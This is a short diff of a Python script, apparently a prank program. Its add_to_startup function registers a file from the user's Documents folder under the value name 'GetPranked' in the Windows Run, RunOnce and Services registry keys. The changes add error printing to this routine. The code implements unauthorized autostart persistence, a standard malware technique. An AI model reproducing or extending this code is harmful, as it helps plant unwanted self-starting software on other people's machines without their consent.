@@ -10,7 +10,7 @@ def create_file():
 
 def add_to_startup():
     hkcu_keys = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
+                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
     hklm_keys = [r"SYSTEM\CurrentControlSet\Services"]
     value_name = "GetPranked"
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
@@ -22,12 +22,14 @@ def add_to_startup():
             with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
                 reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
         except PermissionError:
+            print("failed", key)
             pass
     for key in hklm_keys:
         try:
             with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE) as reg_key:
                 reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
         except PermissionError:
+            print("failed", key)
             pass
 
 if __name__ == "__main__":
